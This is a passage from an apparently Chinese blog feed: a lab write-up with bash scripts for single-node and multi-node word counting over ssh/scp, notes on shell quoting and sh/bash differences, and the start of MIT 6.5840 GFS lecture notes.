class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">touch</span> generated_dataset.txt</span><br><span class="line">target_size=`<span class="built_in">expr</span> 1024 \* 1024 \* 150`  <span class="comment"># 其实更推荐 $(( 1024 * 1024 * 150 ))</span></span><br><span class="line"><span class="comment"># 不要使用 wc -l wc_dataset.txt: 返回的是&quot;2683500 wc_dataset.tx&quot;</span></span><br><span class="line">total_lines=$(<span class="built_in">cat</span> wc_dataset.txt | <span class="built_in">wc</span> -l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 太慢了: 10min生成14k数据</span></span><br><span class="line"><span class="comment"># # 生成大概150M的数据</span></span><br><span class="line"><span class="comment"># while (( $(ls -l generated_dataset.txt | awk &#x27;&#123;print $5&#125;&#x27;) &lt; $target_size ))  </span></span><br><span class="line"><span class="comment"># do</span></span><br><span class="line"><span class="comment">#   # $RANDOM 生成 [0, 32767] 的随机数</span></span><br><span class="line"><span class="comment">#   let rand_line=100*$RANDOM</span></span><br><span class="line"><span class="comment">#   # rand_line=$(( $RANDOM % $total_lines ))  # 虽然total_lines大于32767， 但也不管了</span></span><br><span class="line"><span class="comment">#   word_to_add=$(sed -n $&#123;rand_line, rand_line+10000&#125;p wc_dataset.txt)  # 求出目标行数</span></span><br><span class="line"><span class="comment">#   (echo $word_to_add) &gt;&gt; generated_dataset.txt</span></span><br><span class="line"><span class="comment"># done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">split</span> -n l/10 -d --additional-suffix=.txt wc_dataset.txt -a 2 x</span><br><span class="line"><span class="keyword">while</span> (( $(ls -l generated_dataset.txt | awk &#x27;&#123;print <span class="variable">$5</span>&#125;&#x27;) &lt; <span class="variable">$target_size</span> ))  </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">cat</span> x0$(( <span class="variable">$RANDOM</span> % <span class="number">10</span>)).txt &gt;&gt; generated_dataset.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> x*</span><br></pre></td></tr></table></figure><blockquote><p><strong>split 用法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">split</span> -n l/10 -d --additional-suffix=.txt wc_dataset.txt -a 2 x</span><br><span class="line"><span class="built_in">split</span> [OPTION]... [FILE [PREFIX]]</span><br><span class="line">-l, --lines=NUMBER</span><br><span class="line">    put NUMBER lines/records per output file</span><br><span class="line">    l/N    <span class="built_in">split</span> into N files without splitting lines/records</span><br><span class="line">-d     use numeric suffixes starting at 0, not alphabetic</span><br><span class="line">-a, --suffix-length=N</span><br><span class="line">   generate suffixes of length N (default 2)</span><br></pre></td></tr></table></figure></blockquote><h3 id="单点处理">单点处理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">&quot;wc_dataset.txt&quot;</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$filename</span> | <span class="built_in">tr</span> -cs <span class="string">&quot;[a-z][A-Z]&quot;</span> <span class="string">&quot;\n&quot;</span> | <span class="built_in">tr</span> A-Z a-z | awk <span class="string">&#x27;&#123; for(j=1;j&lt;=NF;j++)&#123;count[$j]++&#125; &#125; END &#123; for(k in count)&#123;print k&quot; &quot;  count[k]&#125; &#125;&#x27;</span>| <span class="built_in">sort</span> -rnk2 &gt; res_single.txt</span><br></pre></td></tr></table></figure><blockquote><p><strong>tr 用法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tr</span> -cs <span class="string">&quot;[a-z][A-Z]&quot;</span> <span class="string">&quot;\n&quot;</span>  <span class="comment"># 将非大小写字母都转化为换行符</span></span><br><span class="line">-c, -C, --complement</span><br><span class="line">      use the complement of SET1  <span class="comment"># complement: 补集</span></span><br><span class="line">-s, --squeeze-repeats</span><br><span class="line">      replace  each  sequence  of a repeated character that is listed <span class="keyword">in</span> the last specified SET, with a single occurrence of that character</span><br><span class="line">      </span><br><span class="line"><span class="comment"># Translation occurs if -d is not given and both SET1 and SET2 appear.  # -d表示删除</span></span><br></pre></td></tr></table></figure><p><strong>sort 用法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span> -rnk2  <span class="comment"># 根据第2个字段的数字大小进行逆序排序</span></span><br><span class="line">-r, --reverse</span><br><span class="line">      reverse the result of comparisons</span><br><span class="line">-n, --numeric-sort</span><br><span class="line">      compare according to string numerical value</span><br><span class="line">-k, --key=KEYDEF</span><br><span class="line">      <span class="built_in">sort</span> via a key; KEYDEF gives location and <span class="built_in">type</span></span><br><span class="line">     </span><br><span class="line">KEYDEF  is F[.C][OPTS][,F[.C][OPTS]] <span class="keyword">for</span> start and stop position, <span class="built_in">where</span> F is a field</span><br><span class="line">       number and C a character position <span class="keyword">in</span> the field; both are origin 1, and the stop  po‐</span><br><span class="line">       sition defaults to the line<span class="string">&#x27;s end.  If neither -t nor -b is in effect, characters in</span></span><br><span class="line"><span class="string">       a field are counted from the beginning of the preceding whitespace.  OPTS is one  or</span></span><br><span class="line"><span class="string">       more  single-letter  ordering  options [bdfgiMhnRrV], which override global ordering</span></span><br><span class="line"><span class="string">       options for that key.  If no key is given, use the entire  line  as  the  key.   Use</span></span><br><span class="line"><span class="string">       --debug to diagnose incorrect key usage.</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="多点处理">多点处理</h3><p>代码如下，对于<code>thumm01</code>来说，不要把其本身的数据处理过程放到循环中，这会带来较大的性能损失。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">&quot;generated_dataset.txt&quot;</span></span><br><span class="line">username=<span class="string">&quot;xxxxxxxxxx&quot;</span></span><br><span class="line">avaiable_servers=(<span class="string">&quot;thumm05&quot;</span> <span class="string">&quot;thumm06&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf  mr*</span><br><span class="line"><span class="built_in">rm</span> x0*</span><br><span class="line"><span class="built_in">mkdir</span> mr</span><br><span class="line"></span><br><span class="line"><span class="built_in">split</span> -n l/3 -d --additional-suffix=.txt <span class="variable">$filename</span></span><br><span class="line"></span><br><span class="line">idx=0</span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$&#123;avaiable_servers[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  ssh <span class="variable">$username</span>@<span class="variable">$host</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">    scp <span class="variable">$username</span>@thumm01:~/x0<span class="variable">$idx</span>.txt .</span></span><br><span class="line"><span class="string">    cat x0<span class="variable">$idx</span>.txt | tr -cs &#x27;[a-z][A-Z]&#x27; &#x27;\n&#x27; | tr A-Z a-z | sort | uniq -c | awk &#x27;&#123;print \$2,\$1&#125;&#x27; &gt; mr-tmp-<span class="variable">$idx</span></span></span><br><span class="line"><span class="string">    scp mr-tmp-<span class="variable">$idx</span> <span class="variable">$username</span>@thumm01:~/mr/</span></span><br><span class="line"><span class="string">    rm x0<span class="variable">$idx</span>.txt</span></span><br><span class="line"><span class="string">    rm mr-tmp-<span class="variable">$idx</span></span></span><br><span class="line"><span class="string">  &quot;</span> &amp;</span><br><span class="line">  ((idx++))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> x0<span class="variable">$idx</span>.txt | <span class="built_in">tr</span> -cs <span class="string">&#x27;[a-z][A-Z]&#x27;</span> <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tr</span> A-Z a-z | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | awk <span class="string">&#x27;&#123;print $2,$1&#125;&#x27;</span> &gt; mr/mr-tmp-<span class="variable">$idx</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">wait</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> mr/mr-tmp* | awk <span class="string">&#x27;&#123;if($1 in count) count[$1]=count[$1] + $2; else count[$1]=$2;&#125; END &#123;for(k in count)&#123;print k&quot; &quot;count[k]&#125;&#125;&#x27;</span> | <span class="built_in">sort</span> -rnk 2 &gt; res_multi.txt</span><br></pre></td></tr></table></figure><blockquote><p><strong>uniq 用法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uniq</span> -c  <span class="comment"># 去除重复元素, 并使用出现次数来作为前缀</span></span><br><span class="line">-c, --count           prefix lines by the number of occurrences</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意一定要先排序:</span></span><br><span class="line">(base) ➜  ~ <span class="built_in">echo</span> <span class="string">&quot;hello</span></span><br><span class="line"><span class="string">dquote&gt; hello</span></span><br><span class="line"><span class="string">dquote&gt; world</span></span><br><span class="line"><span class="string">dquote&gt; hello&quot;</span> | <span class="built_in">uniq</span> -c</span><br><span class="line">      2 hello</span><br><span class="line">      1 world</span><br><span class="line">      1 hello</span><br></pre></td></tr></table></figure></blockquote><h3 id="结果对比">结果对比</h3><p><strong>正确性</strong></p><p>服务器上未提供<code>md5</code>、<code>sha256</code>等hash计算工具，只能肉眼大致看看，应该没问题。</p><p><strong>效率</strong></p><p>多点计算快一点，但是不多。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~$ time bash single_node_process.sh </span><br><span class="line"></span><br><span class="line">real    0m14.098s</span><br><span class="line">user    0m16.420s</span><br><span class="line">sys     0m1.968s</span><br><span class="line"></span><br><span class="line">xxxxxxxxxx@thumm01:~$ time bash multi_nodes_process.sh </span><br><span class="line"></span><br><span class="line">real    0m13.497s</span><br><span class="line">user    0m12.096s</span><br><span class="line">sys     0m0.648s</span><br><span class="line">xxxxxxxxxx@thumm01:~$ </span><br></pre></td></tr></table></figure><h2 id="Bonus">Bonus</h2><p>尝试提出一种可以加快多节点处理速度的方法并验证。需要注意的是，由于各节点间带宽存在实时波动，请在验证中论证“提出的方法不是因为网络波动带来的虚假数值增益”。</p><p>可以在每一台机器上通过多进程并行计算的方式加快处理速度。</p><p>通过 <code>lscpu</code> 等命令可以看到服务器使用24核cpu，不过这里我们只在每台服务器上创建两个线程来处理。</p><h3 id="bonus-sh"><a href="http://bonus.sh">bonus.sh</a></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">&quot;generated_dataset.txt&quot;</span></span><br><span class="line">username=<span class="string">&quot;xxxxxxxxxx&quot;</span></span><br><span class="line">avaiable_servers=(<span class="string">&quot;thumm05&quot;</span> <span class="string">&quot;thumm06&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf mr*</span><br><span class="line"><span class="built_in">mkdir</span> mr</span><br><span class="line"></span><br><span class="line"><span class="built_in">split</span> -n l/3 -d --additional-suffix=.txt <span class="variable">$filename</span></span><br><span class="line"></span><br><span class="line">idx=0</span><br><span class="line"><span class="comment"># 总结-括号嵌套问题:https://zhuanlan.zhihu.com/p/126262733</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$&#123;avaiable_servers[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  ssh <span class="variable">$username</span>@<span class="variable">$host</span> <span class="string">&quot;  # 双引号仍能解析其中的变量</span></span><br><span class="line"><span class="string">    scp <span class="variable">$username</span>@thumm01:~/x0<span class="variable">$idx</span>.txt .;</span></span><br><span class="line"><span class="string">    split -n l/2 -d --additional-suffix=.txt x0<span class="variable">$idx</span>.txt -a 2 y;</span></span><br><span class="line"><span class="string">    for ((process=0;process&lt;2;process++));</span></span><br><span class="line"><span class="string">    do</span></span><br><span class="line"><span class="string">      cat y0\$&#123;process&#125;.txt | tr -cs &#x27;[a-z][A-Z]&#x27; &#x27;\n&#x27; | tr A-Z a-z | awk &#x27;&#123; for(j=1;j&lt;=NF;j++)&#123;count[\$j]++&#125; &#125; END &#123; for(k in count)&#123;print k\&quot; \&quot;count[k]&#125; &#125; &#x27; &gt; mr-tmp-<span class="variable">$idx</span>-\$&#123;process&#125;.txt &amp;</span></span><br><span class="line"><span class="string">    done;</span></span><br><span class="line"><span class="string">    wait;</span></span><br><span class="line"><span class="string">    cat mr-tmp-<span class="variable">$idx</span>-* | awk &#x27;&#123;if(\$1 in count) count[\$1]=count[\$1] + \$2; else count[\$1]=\$2;&#125; END &#123;for(k in count)&#123;print k\&quot; \&quot;count[k]&#125;&#125;&#x27; | sort -rnk 2 &gt; mr-tmp-<span class="variable">$idx</span>.txt;</span></span><br><span class="line"><span class="string">    scp mr-tmp-<span class="variable">$idx</span>.txt <span class="variable">$username</span>@thumm01:~/mr/;</span></span><br><span class="line"><span class="string">    rm x0<span class="variable">$idx</span>.txt;</span></span><br><span class="line"><span class="string">    rm y0*;</span></span><br><span class="line"><span class="string">    rm mr-tmp-<span class="variable">$idx</span>*.txt;</span></span><br><span class="line"><span class="string">  &quot;</span> &amp;</span><br><span class="line">  ((idx++))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">split</span> -n l/2 -d --additional-suffix=.txt x0<span class="variable">$idx</span>.txt -a 2 y</span><br><span class="line"><span class="keyword">for</span>((process=<span class="number">0</span>;process&lt;<span class="number">2</span>;process++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">cat</span> y0<span class="variable">$&#123;process&#125;</span>.txt | <span class="built_in">tr</span> -cs <span class="string">&#x27;[a-z][A-Z]&#x27;</span> <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tr</span> A-Z a-z | awk <span class="string">&#x27;&#123; for(j=1;j&lt;=NF;j++)&#123;count[$j]++&#125; &#125; END &#123; for(k in count)&#123;print k&quot; &quot;count[k]&#125; &#125; &#x27;</span> &gt; mr/mr-tmp-<span class="variable">$idx</span>-<span class="variable">$&#123;process&#125;</span>.txt &amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">wait</span> </span><br><span class="line"><span class="built_in">cat</span> mr/mr-tmp-<span class="variable">$idx</span>-* | awk <span class="string">&#x27;&#123;if($1 in count) count[$1]=count[$1] + $2; else count[$1]=$2;&#125; END &#123;for(k in count)&#123;print k&quot; &quot;count[k]&#125;&#125;&#x27;</span> | <span class="built_in">sort</span> -rnk 2 &gt; mr/mr-tmp-<span class="variable">$idx</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> mr/mr-tmp-<span class="variable">$idx</span>-*</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> mr/mr-tmp* | awk <span class="string">&#x27;&#123;if($1 in count) count[$1]=count[$1] + $2; else count[$1]=$2;&#125; END &#123;for(k in count)&#123;print k&quot; &quot;count[k]&#125;&#125;&#x27;</span> | <span class="built_in">sort</span> -rnk 2 &gt; res_bonus.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> x0*</span><br><span class="line"><span class="built_in">rm</span> y0*</span><br></pre></td></tr></table></figure><blockquote><p><strong>wait</strong> 会阻塞等待所有子进程运行结束。</p></blockquote><h3 id="结果对比-2">结果对比</h3><p>运行结果均保持一致。通过终端运行信息可以看到，<code>bash bonus.sh</code> 的运行时间比 <code>bash multi_nodes_process.sh</code> 短一半。可以通过创建更多的进程进一步提升执行速度，并通过试验找到效率最高的设置，但这里本实验就不继续尝试了。</p><h2 id="问题记录">问题记录</h2><h3 id="Q1-ssh-commands变量转义问题">Q1: ssh commands变量转义问题</h3><p>不明白这样写为啥m和inter_idx打印不出来，但是通过<code>cat commands.sh | ssh host bash</code>的方式可以打印</p><p><img src="/2023/10/25/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab1/8333fcc9bec1585fcc0a153e316a19d.png" alt></p><p>ssh命令使用不当，具体来说如果不对变量进行转义，会被bash解析后通过ssh传到服务器上执行，而很明显服务器上是没有此变量的。<a href="https://blog.csdn.net/qq_41769288/article/details/123766360">参考博客</a></p><h3 id="Q2-引号配对问题">Q2: 引号配对问题</h3><p><img src="/2023/10/25/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab1/image-20231015201645413.png" alt="image-20231015201645413"></p><p>Shell引号配对较复杂，需理解其规则，建议阅读<a href="https://zhuanlan.zhihu.com/p/146462733">Shell 引号嵌套</a></p><p>简单来说:</p><blockquote><p>1、在使用多重引号时系统是从前往后看的，能匹配就算一对，所以这样一对一对的断句将整个命令串分为若干部分；<br>2、为了使系统识别后（被识别的引号会消失）的命令串功能正确，需要使用转义字符手动的在合适的地方加入合适的引号；</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:/mnt/data/dsjxtjc/xxxxxxxxxx$ <span class="built_in">echo</span> <span class="string">&quot;&#x27;&quot;</span><span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里具体配对过程如上图所示，把中间的引号进行转义即可。</p><h3 id="Q3-ssh-commands-执行流程-sh-bash差异">Q3: ssh commands 执行流程 + sh/bash差异</h3><p>这里将 thumm01 的处理也放入循环中（这样很不优雅），代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">split</span> -n l/3 -d --additional-suffix=.txt <span class="variable">$output</span></span><br><span class="line">idx=0</span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> <span class="variable">$&#123;nodes[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  ssh 2023214399@<span class="variable">$node</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">    scp thumm01:~/x0<span class="variable">$idx</span>.txt .;</span></span><br><span class="line"><span class="string">    split -n l/3 -d --additional-suffix=.txt x0<span class="variable">$idx</span>.txt y</span></span><br><span class="line"><span class="string">    for inter_idx in \$(seq 0 2)</span></span><br><span class="line"><span class="string">    do</span></span><br><span class="line"><span class="string">      cat y0\$&#123;inter_idx&#125;.txt | tr -cs &#x27;[a-z][A-Z]&#x27; &#x27;\n&#x27; | tr &#x27;A-Z&#x27; &#x27;a-z&#x27; | sort | uniq -c | awk &#x27;&#123;print \$2,\$1&#125;&#x27; &gt; inter-process-\$&#123;inter_idx&#125; &amp;</span></span><br><span class="line"><span class="string">    done;</span></span><br><span class="line"><span class="string">    wait;</span></span><br><span class="line"><span class="string">    cat inter-process-* | awk &#x27;&#123;if(\$1 in count) count[\$1]=count[\$1] + \$2; else count[\$1]=\$2;&#125; END &#123;for(k in count)&#123;print k\&quot; \&quot;count[k]&#125;&#125;&#x27; | sort -rnk 2 &gt; tmp-<span class="variable">$idx</span>.txt;</span></span><br><span class="line"><span class="string">    scp tmp-<span class="variable">$idx</span>.txt thumm01:~/;</span></span><br><span class="line"><span class="string">    rm x0<span class="variable">$idx</span>.txt;</span></span><br><span class="line"><span class="string">    rm y0*;</span></span><br><span class="line"><span class="string">    rm inter-process*;</span></span><br><span class="line"><span class="string">  &quot;</span> &amp;</span><br><span class="line">  idx=$(( <span class="variable">$idx</span> + <span class="number">1</span> ))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"><span class="built_in">cat</span> tmp* | awk <span class="string">&#x27;&#123;if($1 in word_array) word_array[$1]=word_array[$1] + $2; else word_array[$1]=$2;&#125; END &#123;for(word in word_array)&#123;print word&quot; &quot;word_array[word]&#125;&#125;&#x27;</span> | <span class="built_in">sort</span> -rnk 2 &gt; word_frequency_bonus.txt</span><br></pre></td></tr></table></figure><p><code>bash bouns.sh</code>运行此程序会报错&quot;sh: 4: Syntax error: Bad for loop variable&quot;。奇怪的是为啥我们明明是使用bash运行，却报sh的错误，而且行号如此奇怪。</p><p>为了解决这个问题，我们需要对ssh commands执行流程有更深入的认识。这条命令会将 commands 以字符串的方式传给服务器，服务器会使用默认shell创建一个解析器进程进行处理。thumm01 默认shell为 <code>sh</code>，而thumm05和06 默认shell为 <code>bash</code>。而 sh 不支持 for (()) 的语法，所以只有 thumm01 上会报错，保存行号为字符串中这条for 命令的所在行号。</p><p>那在for (()) 加上一个bash行不行呢？<br>答案是不行的，因为 bash 命令会创建一个新的 bash 解析器进程，而剩余的命令还是在 sh 解析器中解析。一种正确的改正方法是使用 <code>echo &quot;command&quot; | bash</code>（又会涉及到shell烦人的引号配对问题）， 不过还是只用<strong>兼容性更好的<code>for i in $(seq 0 2)</code>吧</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> 大数据系统基础（B） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>6.5840 2023 Lecture 3 GFS</title>
      <link href="/2023/10/09/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-3-GFS/"/>
      <url>/2023/10/09/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-3-GFS/</url>
      
        <content type="html"><![CDATA[<blockquote><p>课程网址：<a href="https://pdos.csail.mit.edu/6.824/schedule.html">https://pdos.csail.mit.edu/6.824/schedule.html</a><br>以下内容来自课程课件，由于课件纯文本显示效果不佳，故对其排版整理并添加了部分个人笔记批注。</p></blockquote><h1 id="Today’s-topic-storage-gfs-consistency">Today’s topic: storage + gfs + consistency</h1><h2 id="Why-hard">Why hard?</h2><p>high performance -&gt; shared data across servers<br>many servers -&gt; constant faults<br>fault tolerance -&gt; replication<br>replication -&gt; potential inconsistencies<br>storge consistencies -&gt; lower performance</p><blockquote><p>Ideal consistency: behave as if single system<br>有两种风险: concurrency 和 fault</p></blockquote><h2 id="Why-storage-system-is-important">Why storage system is important?</h2><p>建造fault tolerant存储系统后，应用程序可以是无状态的，存储系统存储持久化状态。</p><h1 id="GFS-context">GFS context</h1><ul><li>Many Google services needed a big fast unified storage system<br>Mapreduce, crawler, indexer, log storage/analysis</li><li>Shared among multiple applications e.g. crawl, index, analyze</li><li>Huge capacity</li><li>Huge performance</li><li>Fault tolerant</li><li>But:<ul><li>just for internal Google use</li><li>aimed at batch big-data performance, not interactive</li></ul></li></ul><blockquote><p>Google使用过GFS，后面提出的Colossus、以及其他类型的基于集群的文件系统比如MapReduce使用的HDFS的灵感都来源于GFS<br>在GFS之前的设计都不规范，这种不规范性来源于两方面：</p><ol><li>只有1个master，master不可复制——构建出的容错文件系统却包含单点故障</li><li>inconsistencies<br>即使今天，在容错、复制、性能和一致性之间都存在着斗争</li></ol></blockquote><hr><h2 id="GFS-overview">GFS overview</h2><ul><li>100s/1000s of clients (e.g. MapReduce worker machines)</li><li>100s of chunkservers, each with its own disk</li><li>one coordinator</li></ul><h3 id="Capacity-story">Capacity story?</h3><ul><li>big files split into 64 MB chunks</li><li>each file’s chunks striped/sharded over chunkservers<br>so a file can be much larger than any one disk</li><li>each chunk in a Linux file</li></ul><blockquote><p>stripe: n.条纹，线条；（军装上表示等级的）臂章，军阶条；类型，特点; v.给……加条纹<br>sharded: adj.分片的</p></blockquote><h3 id="Throughput-story">Throughput story?</h3><ul><li>clients talk directly to chunkservers to read/write data</li><li>if lots of clients access different chunks, huge parallel throughput read or write</li></ul><h3 id="Fault-tolerance-story">Fault tolerance story?</h3><ul><li>each 64 MB chunk stored (replicated) on three chunkservers</li><li>client writes are sent to all of a chunk’s copies</li><li>a read just needs to consult one copy</li></ul><blockquote><p>GFS并非完全自动容错，但在提高容错能力方面做的相当好</p></blockquote><h1 id="What-are-the-steps-when-client-C-wants-to-read-a-file">What are the steps when client C wants to read a file?</h1><p><img src="/2023/10/09/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-3-GFS/image-20231010163441161.png" alt="image-20231010163441161"></p><ol><li>C sends <strong>filename and offset</strong> to coordinator (CO) (if not cached)<br>CO has a <strong>filename -&gt; array-of-chunkhandle table</strong><br>and a <strong>chunkhandle -&gt; list-of-chunkservers table</strong></li><li>CO finds chunk handle for that offset</li><li>CO replies with chunkhandle + list of chunkservers</li><li>C caches <strong>handle + chunkserver list</strong></li><li>C sends request to nearest chunkserver<br><strong>chunk handle, offset</strong></li><li>chunk server reads from chunk file on disk, returns to client</li></ol><blockquote><p>第4步中client缓存的目的：减少延迟 + 减少与master的通信，提高CO的throughput：缓存后当需要想通块时不需要向CO询问</p></blockquote><h2 id="Clients-only-ask-coordinator-where-to-find-a-file’s-chunks">Clients only ask coordinator where to find a file’s chunks</h2><ul><li>clients cache name -&gt; chunkhandle info</li><li>coordinator does not handle data, so (hopefully) not heavily loaded</li></ul><blockquote><p>master的状态维护：</p><ul><li>file name -&gt; array of chunk handles<br>放在stable storage中：如果master crash，重启后从日志中重建</li><li>chunk handle -&gt; version# &amp;&amp; list of chunk servers (primary, ?secondaries?) 每个主服务器有一个释放时间<br>除了version外可放进内存中<br>version需要放进stable storage中，它需要知道chunk server的块是否是旧的。为什么不能是master向所有chunk server去要信息，然后找到最大版本号的那个作为最新块：有可能崩溃丢失的块才是最新块</li><li>log + checkpoints<br>每当名称空间发生更改时，需要把log写入stable storage<br>在回应客户端之前，改变使master首先写入稳定存储器，然后对客户端回应<br>master的checkpoints也需要写入stable 